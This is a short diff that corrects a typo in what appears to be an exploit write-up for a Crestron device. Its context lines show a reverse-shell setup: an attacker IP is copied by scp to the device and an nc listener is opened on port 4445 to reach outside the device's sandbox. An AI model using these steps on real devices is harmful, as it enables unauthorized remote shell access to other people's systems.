@@ -94,7 +94,7 @@ echo -n 192.168.1.123 > ip
 scp ip crestron@192.168.1.174:/User
 ```
 
-Once the connection is made, you can begin insteracting outside of the sandbox.
+Once the connection is made, you can begin interacting outside of the sandbox.
 
 ```
 Brandons-iMac:~ bperry$ nc -l 4445
